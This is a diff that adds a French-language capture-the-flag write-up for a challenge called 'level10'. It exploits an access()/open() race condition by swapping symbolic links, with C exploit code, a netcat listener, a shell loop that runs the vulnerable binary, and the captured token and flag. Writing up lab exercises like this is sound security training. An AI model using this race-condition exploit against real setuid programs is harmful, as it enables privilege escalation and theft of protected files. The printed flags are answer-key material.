@@ -1,0 +1,69 @@
+# on arrive sur le home on a encore un binaire et un fichier token sans les droits requis pour l'ouvrir
+# j'essaie de lancer le binaire et on a un usage
+
+./level10 file host
+
+# il nous dis qu'il envoie le contenue de fichier a host si il peut l'ouvrir
+# j'essaie donc avec token
+
+./level10 ./token 10.11.200.200
+>>> You don't have access to ./token
+
+#Je lance ltrace sur le binaire (il n'est pas protege contre le tracage) et je vois qu'il fais appelle a la fonction
+# access
+
+#En lisant le man de access, j'apprend qu'il existe une faille exploitable de race condition quand on utilise cette
+# fonction afin de protege un open
+
+#Une race condition consiste a changer rapidement le pointage d'un lien symbolique entre un fichier dont nous avons les
+# droits et le fichier bloque afin qu'access nous renvoie true mais qu'open ouvre le bon fichier
+
+# pour cela je cree un petit exploit avec des appelle systeme pour cree et supprimer des liens symboliques
+
+void main()
+{
+	int i = 10000;
+	while(i)
+	{
+		system("ln -s /tmp/azur/test /tmp/azur/coucou"); // /tmp/azur/test etant mon fichier vide avec les droits
+		system("rm -rf /tmp/azur/coucou");
+		system("ln -s ~/token /tmp/azur/coucou");
+		system("rm -rf /tmp/azur/coucou");
+	}
+}
+
+# je compile et ouvre ensuite 2 autres terminaux, un pour lancer un listener netcat
+
+nc -k -l 6969
+
+# et un autre pour lancer le binaire en boucle
+
+while true; do ./level10 /tmp/azur/coucou 10.11.200.200; done;
+
+# une fois le binaire lancer on peut executer l'exploit
+
+/tmp/azur/a.out
+
+# sur le terminal ou il y a nc on obtiens quelque fois
+
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+
+#voici notre token
+
+su flag10
+woupa2yuojeeaaed06riuj63c
+
+getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
